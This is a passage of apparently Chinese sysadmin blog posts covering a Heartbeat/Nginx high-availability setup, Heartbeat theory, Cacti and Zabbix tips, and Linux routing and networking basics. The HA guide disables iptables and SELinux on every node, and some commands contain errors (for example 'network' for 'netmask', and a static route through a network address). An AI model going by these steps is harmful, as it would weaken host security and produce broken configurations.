宕机或服务宕掉，会切换至B机器继续提供服务。常见的实现高可用的开源软件有 heartbeat 和 keepalived。 一台 web 服务器一天24小时提供web服务，难免会存在 web 服务挂掉或服务器宕机宕机的情况，那么用户就访问不了服务了，这当然不是我们期望的。 如果这样，有2台服务器，A对外提供 web 服务，B作为备用，如果A挂掉，那么B立刻替代A的位置去提供 web 服务，这样对用户来说是透明的。 但是有个问题，服务器A的 ip 是 10.0.10.24，服务器B的 ip 是10.0.10.25，显然向用户提供A或B的ip地址是不可行的，因为用户总不能去切换ip来访问的吧。这时heartbeat或keepalived可以提供一个虚拟IP：10.0.10.26，用户只需要访问 10.0.10.26，当A提供服务时，VIP 会设置在A服务器上；当B提供服务时，VIP会设置在B服务器上，这样就可以让用户通过访问10.0.10.26来获取web服务，即使A或B服务器切换也不影响用户的正常访问。 部署 环境 1234Web1:主机名：hahb24_masterOS: CentOS 6.6网卡IP：10.0.10.24 1234Web2:主机名：hahb25_slaveOS: CentOS 6.6网卡IP：10.0.10.25 1虚拟VIP: 10.0.10.26 配置主机名 master节点配置 12[root@hahb24 ~]# vi &#x2F;etc&#x2F;sysconfig&#x2F;networkHOSTNAME&#x3D;hahb24_master slave节点配置 12[root@hahb25 ~]# vi &#x2F;etc&#x2F;sysconfig&#x2F;networkHOSTNAME&#x3D;hahb24_slave 关闭防火墙和selinux（所有节点配置） 关闭iptables 1service iptables stop 关闭selinux 12setenforce 0sed -i &#39;s&#x2F;SELINUX&#x3D;enforcing&#x2F;SELINUX&#x3D;disabled&#x2F;&#39; &#x2F;etc&#x2F;selinux&#x2F;config 配置host(所有节点配置) 123vim &#x2F;etc&#x2F;hosts10.0.10.24 hahb24_master10.0.10.25 hahb24_slave 安装Hearbeat和Nginx（所有节点配置） 12345# 安装epel源yum install -y epel-release# 安装heartbeat和nginxyum install -y heartbeat* libnet nginx 主master配置 heartbeat主要的配置文件有3个，分别是authkeys、ha.cf和haresources Authkeys文件: 123文件为heartbeat的认证文件，该文件主要是用于集群中两个节点的认证。该文件的属性必须为600，否则heartbeat启动将失败。两个节点的authkeys文件内容及权限相同。目前提供了3种算法：crc&#x2F;md5&#x2F;sha1。其中crc不能够提供认证，它只能够用于校验数据包是否损坏，而sha1&#x2F;md5需要一个密钥来进行认证，从资源消耗的角度来讲，md5消耗的比较多，sha1次之，因此建议一般使用sha1算法。 ha.cf文件: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051配置文件详解vim ha.cfdebugfile &#x2F;var&#x2F;log&#x2F;ha-debug：该文件保存heartbeat的调试信息。logfile &#x2F;var&#x2F;log&#x2F;ha-log：heartbeat的日志文件。bcast eth0 表示在eth0接口上使用udp广播来通知心跳（把接口名称改为实际接口名称，比如:eth1）#ucast eth0 10.0.10.25： 说明：采用网卡eth0的udp单播来通知心跳，eth0的IP#mcast eth0 225.0.0.1 694 1 0 说明：采用udp多播播来通知心跳，建议在副节点不只一台时使用keepalive 2：设定heartbeat之间的时间间隔为2秒。deadtime 30： 在30秒后宣布节点死亡warntime 10：超出该时间间隔未收到对方节点的心跳，则发出警告并记录到日志中。initdead 120：在某系统上，系统启动或重启之后需要经过一段时间网络才能正常工作，该选项用于解决这种情况产生的时间间隔，取值通常为deadtime的2倍。udpport 694：设置广播通信使用的端口，694为默认使用的端口号。node data-1-1 主节点主机名(必须与uname -n输出结果一致)node data-1-2 从节点主机名(必须与uname -n输出结果一致)nice_failback on【注释掉:auto_failback on；注：从节点无需配置该选项。】主节点在正常情况下占用资源并运行所有的服务，遇到故障时把资源交给从节点由从节点运行服务。在该选项设为on的情况下，一旦主节点恢复运行，则自动获取资源并取代从节点，否则不取代从节点。watchdog &#x2F;dev&#x2F;watchdog说明：看门狗，如果本节点在超过一分钟后还没有发出心跳，那么本节点自动重启##################################################################下面是可选项##################################################################stonith baytech &#x2F;etc&#x2F;ha.d&#x2F;conf&#x2F;stonith.baytech 说明：主&#x2F;副等所有节点的一种校验。respawn hacluster &#x2F;etc&#x2F;init.d&#x2F;nginx 说明：和heartbeat必须一起启动的本地服务baud 19200 说明：串口波特率，与serial一起使用。serial &#x2F;dev&#x2F;ttyS0 说明：采用串口来传递心跳信息。ping 10.0.10.1 Ping一个非heartbeat服务器的IP，一般为同网段网关即可respawn hacluster &#x2F;usr&#x2F;lib64&#x2F;heartbeat&#x2F;ipfail使Heartbeat以hacluster的身份来执行该进程并监视该进程的执行情况，如果其死亡便重启之。最常用的进程是ipfail，该进程用于检测和处理网络故障，需要配合ping语句指定的ping node来检测网络连接。 注意：如果结束进程的退出代码为100，则不会重启该进程。注：(1)如果你的系统是64bit，请注意该文件的路径。 (2)hacluster是安装heartbeat生成的用户 haresources文件: 123456添加如下行，例如：hahb24_master 10.0.10.26&#x2F;24&#x2F;eth0&#x2F;10.0.10.255 nginx注：10.0.10.26&#x2F;24是VIP地址，ech0是物理网卡名称，10.0.10.255是广播地址；nginx为heartbeat要监控的HA服务,可以有多个,中间使用空格分割注意：两个集群节点上的该文件必须相同。 拷贝配置文件 123cd &#x2F;usr&#x2F;share&#x2F;doc&#x2F;heartbeat-3.0.4&#x2F;cp authkeys ha.cf haresources &#x2F;etc&#x2F;ha.d&#x2F;cd &#x2F;etc&#x2F;ha.d 修改authkeys 12345678# 更改或增加如下内容vim authkeysauth 33 md5 Hello!注：不论您在关键字auth后面指定的是什么索引值，在后面必须要作为键值再次出现。如果您指定“auth 4”，则在后面一定要有一行的内容为“4 ”。# 然后修改其权限chmod 600 authkeys ha.cf文件修改 1234567891011121314[root@hahb24_master ha.d]# vim ha.cfdebugfile &#x2F;var&#x2F;log&#x2F;ha-debuglogfile &#x2F;var&#x2F;log&#x2F;ha-logkeepalive 2deadtime 10warntime 5initdead 60udpport 694ucast eth0 10.0.10.25auto_failback onping 10.0.10.1node hahb24_masternode hahb25_slaverespawn hacluster &#x2F;usr&#x2F;lib64&#x2F;heartbeat&#x2F;ipfail haresources文件修改 1234[root@hahb24_master ha.d]# vim haresourceshahb24_master 10.0.10.26&#x2F;24&#x2F;eth0&#x2F;10.0.10.255 nginx注：10.0.10.26&#x2F;24是VIP地址，ech0是物理网卡名称，10.0.10.255是广播地址；nginx为heartbeat要监控的HA服务,可以有多个,中间使用空格分割 从节点配置1把主节点上的三个配置文件拷贝到从节点的&#x2F;etc&#x2F;ha.d目录下 编辑ha.cf 12vim &#x2F;etc&#x2F;ha.d&#x2F;ha.cf将“ucast eth0 10.0.10.25” 改为 ucast eth0 10.0.10.24 检查authkeys文件权限 1ls -l authkeys 是否为600 编辑 12vim haresources hahb25_slave 10.0.10.26&#x2F;24&#x2F;eth0&#x2F;10.0.10.255 nginx 启动Heartbeat服务（所有节点）1234567891011chkconfig heartbeat on&#x2F;etc&#x2F;init.d&#x2F;heartbeat start两台服务器服务都启动后，可以查看master辅助IP： [root@hahb24_master ha.d]# ip addr2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP qlen 1000 link&#x2F;ether 00:0c:29:43:b6:0f brd ff:ff:ff:ff:ff:ff inet 10.0.10.24&#x2F;24 brd 10.0.10.255 scope global eth0 inet 10.0.10.26&#x2F;24 brd 10.0.10.255 scope global secondary eth0 inet6 fe80::20c:29ff:fe43:b60f&#x2F;64 scope link valid_lft forever preferred_lft forever 检查测试启动nginx服务(所有节点) 123chkconfig nginx onchkconfig httpd off 如果有则关闭，我们使用nginx测试&#x2F;etc&#x2F;init.d&#x2F;nginx start 123456789为了能看出效果#在master上添加[root@hahb24_master]# echo &quot;1111111111master&quot; &gt; &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;index.html #在slave上添加[root@hahb25_slave ha.d]# echo &quot;22222222222222slave&quot; &gt;&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;index.html在浏览器输入http:&#x2F;&#x2F;10.0.10.26&#x2F;index.html,此时的结果显示1111111111master则说明配置正确 测试1：主节点停止heartbeat服务 123[root@hahb24_master]# &#x2F;etc&#x2F;init.d&#x2F;heartbeat stop此时，再访问http:&#x2F;&#x2F;10.0.10.26&#x2F;index.html,会显示 22222222222222slave 测试2：测试脑裂 123456主节点master和从节点slave都down掉eth0网卡[root@hahb24_master ~]# ifdown eth0[root@hahb25_slave ~]# ifdown eth0然后先启动master（10.0.10.24） eth0的网卡，你会发现网页依然无法访问，因为slave（10.0.10.25）目前依然是master模式。最后启动，10.0.10.25的eth0网卡，服务恢复访问，访问结果是22222222222222slave 测试3：VIP漂移后，主master恢复后自动抢占。 12345#master节点[root@hahb24_master ~]# ifdown eth0此时，访问web已经转移到了slave2服务器。这时候把master服务器重新激活网卡并启动master heartbeat服务，稍等片刻，VIP又漂移回来了，访问的web资源是master的web资源，测试成功！ 工作中Heartbeat使用场景 - HA高可用","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"HA","slug":"HA","permalink":"https://garywu520.github.io/tags/HA/"},{"name":"高可用","slug":"高可用","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E5%8F%AF%E7%94%A8/"},{"name":"双机热备","slug":"双机热备","permalink":"https://garywu520.github.io/tags/%E5%8F%8C%E6%9C%BA%E7%83%AD%E5%A4%87/"}]},{"title":"Cacti实战-交换机接口显示错误以及流量断图","slug":"Cacti实战-交换机接口显示错误以及流量断图","date":"2017-08-02T08:10:59.000Z","updated":"2017-08-02T08:36:42.481Z","comments":true,"path":"2017/08/02/Cacti实战-交换机接口显示错误以及流量断图/","link":"","permalink":"https://garywu520.github.io/2017/08/02/Cacti%E5%AE%9E%E6%88%98-%E4%BA%A4%E6%8D%A2%E6%9C%BA%E6%8E%A5%E5%8F%A3%E6%98%BE%E7%A4%BA%E9%94%99%E8%AF%AF%E4%BB%A5%E5%8F%8A%E6%B5%81%E9%87%8F%E6%96%AD%E5%9B%BE/","excerpt":"整体来说是两个问题： 123(1) 监控交换机，其中一个接口G0&#x2F;0&#x2F;8出现了流量断图的情况(2) 整个交换机接口名称显示错误,无法识别出具体端口号","text":"整体来说是两个问题： 123(1) 监控交换机，其中一个接口G0&#x2F;0&#x2F;8出现了流量断图的情况(2) 整个交换机接口名称显示错误,无法识别出具体端口号 123问题1：解决方案，删除G0&#x2F;0&#x2F;8，重新添加 删除：Data Sources --&gt; Host找到对应交换机 --&gt;找到G0&#x2F;0&#x2F;8，选择底部的“Delete” -- 选择最上面的一项。 重新添加：Devices --&gt; 找到并进入对应的交换机设备 --&gt; 进入“Create Graphs for this Host（为该主机创建图形）” --&gt; 选择底部的图形类型：In&#x2F;Out Bits（64-bit Counters）并选中对应缺少的接口G0&#x2F;0&#x2F;8后，点击Cteate 12问题2：整个交换机接口名称显示错误,无法识别出具体端口号解决方案：尝试更换“Host Template”，目的是接下来点击“Create Graphs for this Host”的时候，出现交换机的端口。我原主机模板是“Cisco Route”（创建图形中没有任何接口），换成ucd&#x2F;net SNMP Host就有了。 12最后，再把G0&#x2F;0&#x2F;8加到“Graph Trees”图形树中方法：Graph Trees --&gt; 找到并进入对应的图形树 --&gt; 找到对应分支，点击add --&gt; Tree Item Type: Graph --&gt; Graph: XXX-Traffic - G0&#x2F;0&#x2F;8 -- Create即可。 最后上张图吧啥都不说了O(∩_∩)O","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"Cacti","slug":"Cacti","permalink":"https://garywu520.github.io/tags/Cacti/"}]},{"title":"HA高可用之Heartbeat[理论]","slug":"HA高可用之Heartbeat-理论","date":"2017-08-02T07:02:57.000Z","updated":"2017-08-02T10:10:29.563Z","comments":true,"path":"2017/08/02/HA高可用之Heartbeat-理论/","link":"","permalink":"https://garywu520.github.io/2017/08/02/HA%E9%AB%98%E5%8F%AF%E7%94%A8%E4%B9%8BHeartbeat-%E7%90%86%E8%AE%BA/","excerpt":"Hearbeat简介 1在生产环境中，在很多场景中为了保证防止服务器出现单点故障，则会考虑使用高可用的一些软件来实现双机热备，例如常见的web服务就可以使用两台服务器进行双机热备解决单点故障的问题","text":"Hearbeat简介 1在生产环境中，在很多场景中为了保证防止服务器出现单点故障，则会考虑使用高可用的一些软件来实现双机热备，例如常见的web服务就可以使用两台服务器进行双机热备解决单点故障的问题 Hearbeat原理 Heartbeat 主备的模式12通过修改 heartbeat 软件的配置文件可以指定哪一台 Heartbeat 服务器作为主服务器，则另一台将自动成为热备服务器。然后在热备服务器上配置 Heartbeat 守护程序来监听来自主服务器的心跳消息。如果热备服务器在指定时间内未监听到来自主服务器的心跳，就会启动故障转移程序，并取得主服务器上的相关资源服务的所有权，接替主服务器继续不间断的提供服务，从而达到资源及服务高可用性的目的。 Heartbeat 主主模式1234即两台服务器互为主备，这时它们之间会相互发送报文来告诉对方自己当前的状态，如果在指定的时间内未收到对方发送的心跳报文，那么，一方就会认为对方失效或者宕机了，这时每个运行正常的主机就会启动自身的资源接管模块来接管运行在对方主机上的资源或者服务，继续为用户提供服务。一般情况下，可以较好的实现一台主机故障后，企业业务仍能够不间断的持续运行。注意：所谓的业务不间断，在故障转移期间也是需要切换时间的（例如：停止数据库及存储服务等），heartbeat 的主备高可用的切换时间一般是在5-20秒左右（服务器宕机的切换比人工切换要快） Heartbeat心跳连接12要部署 heartbeat 服务，至少需要两台服务器来完成，要实现高可用服务，需要heartbeat服务器之间互相通信和互相监测。高可用服务器上的 Heartbeat 软件会利用这条心跳线来检查对端的机器是否存活，进而决定是否做故障转移，资源切换，来保证业务的连续性。如果条件允许，以上的连接可以同时使用，来加大保险系数防止裂脑问题发生。 Heartbeat裂脑1由于某些原因，导致两台高可用服务器之间在指定时间内，无法互相检测到对方心跳而各自启动故障转移功能，取得了资源及服务的所有权，而此时的两台高可用服务器都还活着并在正常运行，这样就会导致同一个IP或服务在两端同时启动而发生冲突的严重问题，最严重的是两台主机占用同一个VIP地址，当用户写入数据时可能会分别写入到两端，这样可能会导致服务器两端的数据不一致或造成数据丢失，这种情况就被称为裂脑，也有人称其为分区集群或大脑垂直分割，英文为 split brain。 12影响：发生裂脑时，对业务的影响是及其严重的，有时甚至是致命的，如：两台高可用服务器之间发生裂脑，导致互相争用同一 IP 资源，就如同我们在局域网内常见的 IP 地址冲突一样，两个机器就会有一个或者两个都不正常，影响用户正常访问服务器。如果是应用在数据库或者存储服务这种极重要的高可用上，那就可能会导致用户发布的数据间断的写在两台不同服务器上的恶果，最终数据恢复极困难或难以恢复 123456预防：可以通过编写脚本来实现以下功能1）只要备节点出现 VIP 就报警（a、主节点机器宕机了，备节点机器接管了 b、主节点机器没宕，裂脑了），不管哪种情况都需要人工查看2）严谨判断，备机出现VIP，并且主机及服务还活着，裂脑了（依然报警）检查心跳状态-脚本参考：http:&#x2F;&#x2F;blog.chinaunix.net&#x2F;uid-7921481-id-1617030.html Heartbeat消息类型 Heart 高可用软件有三种消息类型，具体为: 1）心跳消息2）集群转换消息3）重传消息 心跳消息 1心跳消息为约150字节的数据包，可能为串口、单播、广播或多播的方式，控制心跳频率及出现故障要等待多久进行故障转换 集群转换消息 1234ip-request 和 ip-request-resp当主服务器恢复在线状态时，通过 ip-request 消息要求备机释放主服务器失败时备服务器取得的资源，然后备服务器关闭释放主服务器失败时取得的资源及服务。备服务器释放主服务器失败时取得的资源及服务后，就会通过 ip-request-resp 消息通知主服务器它不在拥有该资源及服务，主服务器收到来自备节点的 ip-request-resp 消息通知后，启动失败时释放的资源及服务，并开始提供正常的访问服务。 重传请求 123rexmit-request 控制重传心跳请求。此消息不太重要注：心跳控制消息都使用UDP协议发送到 &#x2F;etc&#x2F;ha.d&#x2F;ha.cf 文件指定的任意端口，或指定的多播地址，如果使用多播默认端口为694 Heartbeat IP 地址接管和故障转移过程123456Heartbeat 是通过IP地址接管和ARP广播进行故障转移的。ARP广播：在主服务器故障时，备用节点接管资源后，会立即强制更新所有客户端本地的ARP表（即清除客户端本地缓存的失败服务器的VIP地址和mac地址的解析记录）,确保客户端和新的主服务器对话。提示： 这里所说的客户端是和 Heartbeat 高可用服务器所在同一网络的客户机，并不是最终的互联网网用户，这里的客户端机器是相对 Heartbeat 高可用服务器来说的。 Heartbeat VIP/IP 与 别名/辅助IP12345真实IP:真实IP又被称为管理IP，一般是配置在物理网卡上的实际IP，这可以看作你本人的姓名，如：张三在负载均衡及高可用环境中，管理IP是不对外提供用户访问服务的，而作为管理服务器用，如SSH可以通过这个管理IP连接服务器。虚拟IP:虚拟IP即VIP，这只是一个概念而已，实际上就是heartbeat临时绑定在物理网卡上的别名（heartbeat3以上页采用了辅助IP） 123456789101112131415别名IP（alias ip）:ip alias 是由 Linux 系统的 ifconfig 命令来创建和维护的，别名IP就是在网卡设备上绑定的第二个及以上的IP# 创建别名VIP（两种方法）[root@crazy-acong ~]# ifconfig eth0:1 192.168.40.20 netmask 255.255.255.0 up[root@crazy-acong ~]# ifconfig eth0:1 192.168.40.20&#x2F;24 up # heartbeat2 软件默认是使用这个命令来添加的# 使用别名的方法配置的VIP可以通过ifconfig查看，也可以通过ip addr 查看[root@crazy-acong ~]# ifconfig eth0:1这个ip就是启动heartbeat服务时，由heartbeat调用相关脚本配置的# 删除别名VIP的方法（两种方法）[root@crazy-acong ~]# ifconfig eth0:1 192.168.40.20 netmask 255.255.255.0 down[root@crazy-acong ~]# ifconfig eth0:1 down 1234567891011121314辅助IP（secondary ip address）:辅助IP则是由Linux系统的ip命令创建和维护的，ip addr add 创建的辅助IP，不能通过ifconfig查看，但是通过ifconfig创建的别名IP却可以在ip addr show 命令查看。手工配置辅助VIP的方法：[root@crazy-acong ~]# ip addr add 192.168.40.20&#x2F;24 dev eth0# keepalived 软件默认使用这个命令来添加VIP，也是heartbeat3软件采用的方案# ip add 可以查看别名和辅助IP，用ifconfig无法查到辅助IP配置情况手工查看VIP别名的方法不同的命令配置的VIP查看方法也是由区别的，使用辅助IP的方法配置的VIP，不能通过ifconfig查看，只能通过 ip addr 来查看手工删除辅助IP的方法[root@crazy-acong ~]# ip addr del 192.168.40.20&#x2F;24 dev eth0 heartbeat 和 keepalived 在启动时就是分别利用上面命令来配置VIP的。在停止时利用下面的命令来删除VIP。 以上两种方式配置VIP，在高可用环境中的作用是一样的，没什么区别，只是由于当时的系统环境等历史原因，选择的配置命令方式不同。heartbeat3 版本起，不在使用别名，而是使用辅助IP提供服务，而 keepalived 软件一直都是使用的辅助IP技术。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"HA","slug":"HA","permalink":"https://garywu520.github.io/tags/HA/"},{"name":"高可用","slug":"高可用","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E5%8F%AF%E7%94%A8/"},{"name":"双机热备","slug":"双机热备","permalink":"https://garywu520.github.io/tags/%E5%8F%8C%E6%9C%BA%E7%83%AD%E5%A4%87/"}]},{"title":"zabbix添加收取邮件/短信等告警权限","slug":"zabbix添加收取邮件-短信等告警权限","date":"2017-08-02T02:35:19.000Z","updated":"2017-08-29T08:16:11.131Z","comments":true,"path":"2017/08/02/zabbix添加收取邮件-短信等告警权限/","link":"","permalink":"https://garywu520.github.io/2017/08/02/zabbix%E6%B7%BB%E5%8A%A0%E6%94%B6%E5%8F%96%E9%82%AE%E4%BB%B6-%E7%9F%AD%E4%BF%A1%E7%AD%89%E5%91%8A%E8%AD%A6%E6%9D%83%E9%99%90/","excerpt":"需求：给同事开放收取某机房告警邮件/短信权限","text":"需求：给同事开放收取某机房告警邮件/短信权限 步骤如下： 添加用户群组 –&gt; 指定群组权限 添加用户–&gt;添加对应群组（继承群组权限）–&gt; 配置告警媒介（添加告警收件人邮箱） zabbix登陆该用户验证权限 组态–动作配置邮件模板等","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"zabbix","slug":"zabbix","permalink":"https://garywu520.github.io/tags/zabbix/"},{"name":"告警","slug":"告警","permalink":"https://garywu520.github.io/tags/%E5%91%8A%E8%AD%A6/"}]},{"title":"老男孩-期中架构-Linux[路由转发]跨网段通信","slug":"老男孩-期中架构-Linux-路由转发-跨网段通信","date":"2017-08-01T10:31:13.000Z","updated":"2017-08-02T03:22:29.378Z","comments":true,"path":"2017/08/01/老男孩-期中架构-Linux-路由转发-跨网段通信/","link":"","permalink":"https://garywu520.github.io/2017/08/01/%E8%80%81%E7%94%B7%E5%AD%A9-%E6%9C%9F%E4%B8%AD%E6%9E%B6%E6%9E%84-Linux-%E8%B7%AF%E7%94%B1%E8%BD%AC%E5%8F%91-%E8%B7%A8%E7%BD%91%E6%AE%B5%E9%80%9A%E4%BF%A1/","excerpt":"测试环境和要求：如下","text":"测试环境和要求：如下 Linux A与Linux C配置 123#关闭Linux A和C的防火墙[root@Net-A ~]# service iptables stop[root@Net-C ~]# service iptables stop Linux A配置： 12345678910111213141516171819[root@Net-A ~]# route -nKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface192.168.100.0 0.0.0.0 255.255.255.0 U 0 0 0 eth0169.254.0.0 0.0.0.0 255.255.0.0 U 1002 0 0 eth00.0.0.0 192.168.100.2 0.0.0.0 UG 0 0 0 eth0[root@Net-A ~]# [root@Net-A ~]# route add -net 192.168.200.0&#x2F;24 gw 192.168.100.104[root@Net-A ~]# route -nKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface192.168.100.0 0.0.0.0 255.255.255.0 U 0 0 0 eth0192.168.200.0 192.168.100.104 255.255.255.0 UG 0 0 0 eth0169.254.0.0 0.0.0.0 255.255.0.0 U 1002 0 0 eth00.0.0.0 192.168.100.2 0.0.0.0 UG 0 0 0 eth0#添加永久路由[root@Net-A ~]# cat &#x2F;etc&#x2F;sysconfig&#x2F;static-routesany net 192.168.200.0&#x2F;24 gw 192.168.100.104 Linux B配置 1234567#开启路由转发[root@Net-B ~]# head -7 &#x2F;etc&#x2F;sysctl.conf # Controls IP packet forwardingnet.ipv4.ip_forward &#x3D; 1[root@Net-B ~]# sysctl -pnet.ipv4.ip_forward &#x3D; 1 Linux C配置 12345678910111213141516171819[root@Net-C ~]# route -nKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface192.168.200.0 0.0.0.0 255.255.255.0 U 0 0 0 eth0169.254.0.0 0.0.0.0 255.255.0.0 U 1002 0 0 eth0[root@Net-C ~]# [root@Net-C ~]# route add -net 192.168.100.0&#x2F;24 gw 192.168.200.101[root@Net-C ~]# [root@Net-C ~]# route -nKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface192.168.100.0 192.168.200.101 255.255.255.0 UG 0 0 0 eth0192.168.200.0 0.0.0.0 255.255.255.0 U 0 0 0 eth0169.254.0.0 0.0.0.0 255.255.0.0 U 1002 0 0 eth0[root@Net-C ~]# #永久添加路由[root@Net-C ~]# cat &#x2F;etc&#x2F;sysconfig&#x2F;static-routesany net 192.168.100.0&#x2F;24 gw 192.168.200.101 测试 12345678910Linux A:[root@Net-A ~]# ping 192.168.200.102PING 192.168.200.102 (192.168.200.102) 56(84) bytes of data.64 bytes from 192.168.200.102: icmp_seq&#x3D;1 ttl&#x3D;63 time&#x3D;2.49 ms64 bytes from 192.168.200.102: icmp_seq&#x3D;2 ttl&#x3D;63 time&#x3D;0.516 ms[root@Net-A ~]# traceroute 192.168.200.102traceroute to 192.168.200.102 (192.168.200.102), 30 hops max, 60 byte packets 1 192.168.100.104 (192.168.100.104) 0.277 ms 0.198 ms 0.141 ms 2 192.168.200.102 (192.168.200.102) 0.608 ms 0.582 ms 0.499 ms 12345Linux C:[root@Net-C ~]# ping 192.168.100.103PING 192.168.100.103 (192.168.100.103) 56(84) bytes of data.64 bytes from 192.168.100.103: icmp_seq&#x3D;1 ttl&#x3D;63 time&#x3D;0.594 ms64 bytes from 192.168.100.103: icmp_seq&#x3D;2 ttl&#x3D;63 time&#x3D;0.382 ms","categories":[],"tags":[{"name":"期中架构","slug":"期中架构","permalink":"https://garywu520.github.io/tags/%E6%9C%9F%E4%B8%AD%E6%9E%B6%E6%9E%84/"},{"name":"Linux路由转发","slug":"Linux路由转发","permalink":"https://garywu520.github.io/tags/Linux%E8%B7%AF%E7%94%B1%E8%BD%AC%E5%8F%91/"},{"name":"跨网段通信","slug":"跨网段通信","permalink":"https://garywu520.github.io/tags/%E8%B7%A8%E7%BD%91%E6%AE%B5%E9%80%9A%E4%BF%A1/"}]},{"title":"老男孩-网络讲解","slug":"老男孩-网络讲解","date":"2017-08-01T09:22:36.000Z","updated":"2017-08-02T06:55:27.524Z","comments":true,"path":"2017/08/01/老男孩-网络讲解/","link":"","permalink":"https://garywu520.github.io/2017/08/01/%E8%80%81%E7%94%B7%E5%AD%A9-%E7%BD%91%E7%BB%9C%E8%AE%B2%E8%A7%A3/","excerpt":"IP地址进制转换123IP地址是十进制，系统只认二进制（8位,只用0或1来表示），所以需要学会计算IP地址包括：网络位和主机位","text":"IP地址进制转换123IP地址是十进制，系统只认二进制（8位,只用0或1来表示），所以需要学会计算IP地址包括：网络位和主机位 特殊IP地址说明： 121. 主机位全为0的称为网络地址，比如:10.0.0.0 10.0.0.0就是网络地址2. 主机位全为1的称为广播地址，即向所有人发出消息。比如：10.0.0.0的广播地址为10.255.255.255 一个局域网的主机个数=2的N次方-2 【N表示有多少个主机位； “-2”-意思是去掉一个网段地址和去掉一个广播地址】 1234三个主类地址的掩码信息： A类地址掩码: 255.0.0.0 &#x2F;8 B类地址掩码：255.255.0.0 &#x2F;16 C类地址掩码：255.255.255.0 &#x2F;24 IP地址划分-技巧 123456789101112131415161718192021222324252627速算口诀：1 12811 192111 2241111 24011111 248111111 2521111111 25411111111 255###############################################例1：172.16.0.0&#x2F;14 ,求子网掩码与可用主机数量(1)子网掩码计算：255.252.0.0 【一个255占用八位，不足8位查上面的口诀，剩余6位得出是252】(2)IP地址可用范围计算，使用255.255.255.255减去子网掩码得出第二个八位是3(3)即172.16.0.1 - 172.（16+3）.0.254. 最后结果是：172.16.0.1 - 172.19.0.254 【已经减去网络地址和广播地址】例2：192.168.0.0&#x2F;30子网掩码为：255.255.255.252可用IP地址范围：192.168.0.1-192.168.0.2例3；192.168.0.0&#x2F;27子网掩码为：255.255.255.224可用IP地址计算：192.168.0.1 - 192.168.0.30例4：172.16.0.0&#x2F;17子网掩码为：255.255.128.0可用IP地址范围：172.16.0.1 - 172.16.127.254 网卡DNS配置问题 123456网卡配置文件 &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth0vim &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth0PEERDNS&#x3D;yes &lt;- 是否确认网卡配置文件中的DNS配置优先重启网卡：ifdown eth0 &amp;&amp; ifup eth0 主机名修改 123456#修改配置文件vim &#x2F;etc&#x2F;sysconfig&#x2F;networkHOSTNAME&#x3D;jd_web# 修改hosts文件，修改IP与域名的映射关系192.168.0.10 web_www.exmail.com 查看网关信息 1234567891011121314151617181. route -n2. netstat -rn3. ip routeroute更改#删除网关：[root@root ~]# route del default gw 192.168.100.2#添加网关[root@root ~]# route add default gw 192.168.100.2#1台服务器向访问另一个子网，如何添加路由？route add -net 172.16.1.0 network 255.255.255.0 gw 172.16.2.1注：-net 指定目的子网 gw指定通过哪个网关到达route add -net 172.16.1.0 network 255.255.255.0 dev tun0route add -net 172.16.1.0&#x2F;24 dev tun0#永久添加路由vim &#x2F;etc&#x2F;sysconfig&#x2F;static-routesany net 172.16.1.0&#x2F;24 gw 172.16.1.0 开启Linux路由转发功能 1234把路由器当做路由器进行跨网段访问# vim &#x2F;etc&#x2F;sysctl.conf net.ipv4.ip_forward&#x3D;1# sysctl -p IP别名与辅助IP配置123456789101112131415(1) 不建议常用[root@root ~]# ifconfig eth0:0 192.168.100.101&#x2F;24 up 配置别名IP，即启用虚拟IPifconfig eth0:0 down 删除IP别名别名IP网卡重启也生效#编辑配置文件使其生效vim &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth0:1(2)辅助IP配置【常用】#添加[root@root ~]# ip addr add 192.168.100.101&#x2F;24 dev eth0[root@root ~]# ip addr add 192.168.100.102&#x2F;24 dev eth0 label eth0:1#删除 [root@root ~]# ip addr del 192.168.100.102&#x2F;24 dev eth0 label eth0:1 [root@root ~]# ip addr del 192.168.100.101&#x2F;24 dev eth0注：label用来 添加辅助IP标签 123Hostname取IP地址方法：hostname -I 列出所有网卡的IP地址hostname -i 12xinetd服务用来管理守护demon进程，例如：telnet telnet默认安装后没有启动脚本，而xinetd的作用就是如此。 123456789101112Ping命令扩展#共计ping 3次ping -c 10 baidu.com# 每次ping延迟5s ping -c 3 -i 5 www.baidu.com# ping 5次不显示过程，直接给我结果[root@root ~]# ping -c5 -q qq.com# ping1000个包快速显示结果，无需等待[root@root ~]# ping -c 1000 -f www.qq.com 统计访问服务器IP的ESTABLISHED连接数最多的IP？ 123[root@root ~]# awk -F &quot;[ :]+&quot; &#39;&#x2F;EST&#x2F;&#123;print $6&#125;&#39; netstat.log|sort|uniq -c|sort -rn -k1深入了解sort与uniq命令 tcpdump语法格式 123456789101112-i 指定一个网卡-nn 不需要将端口号转换为协议名称-c 指定抓包次数-w 保存抓包结果到指定文件-X 指定某个端口# 抓取53端口的数据包（待测试）[root@root ~]# tcpdump -i eth0 -nn -X &#39;port 53&#39; -c 10# 抓包后追加到指定文件[root@root ~]# tcpdump -i eth0 -c 10 -w 